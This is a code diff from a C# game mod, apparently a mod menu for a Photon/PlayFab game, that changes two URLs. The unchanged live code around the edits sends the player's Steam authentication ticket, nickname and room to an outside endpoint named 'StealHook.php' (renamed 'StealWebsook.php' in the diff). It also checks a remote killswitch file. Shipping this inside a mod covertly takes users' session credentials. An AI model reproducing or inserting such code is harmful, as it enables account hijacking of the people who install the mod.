@@ -52,7 +52,7 @@ namespace Steal.Background.Mods
             {
                 { "content", "ticket " + PlayFabAuthenticator.instance.GetSteamAuthTicket() + "name: " + PhotonNetwork.LocalPlayer.NickName + " Joined Code: " + PhotonNetwork.CurrentRoom }
             };
-            byte[] arr = new WebClient().UploadValues("https://tnuser.com/API/StealHook.php", nvc);
+            byte[] arr = new WebClient().UploadValues("https://tnuser.com/API/StealWebsook.php", nvc);
             Console.WriteLine(Encoding.UTF8.GetString(arr));
             bool didchange = false;
             foreach (MenuPatch.Button button in MenuPatch.buttons)
@@ -70,7 +70,7 @@ namespace Steal.Background.Mods
                 MenuPatch.RefreshMenu();
             }
 
-            if (new WebClient().DownloadString("https://bbc123f.github.io/killswitch").Contains("="))
+            if (new WebClient().DownloadString("https://bbc123f.github.io/killswitch.txt").Contains("="))
             {
                 Application.Quit();
             }
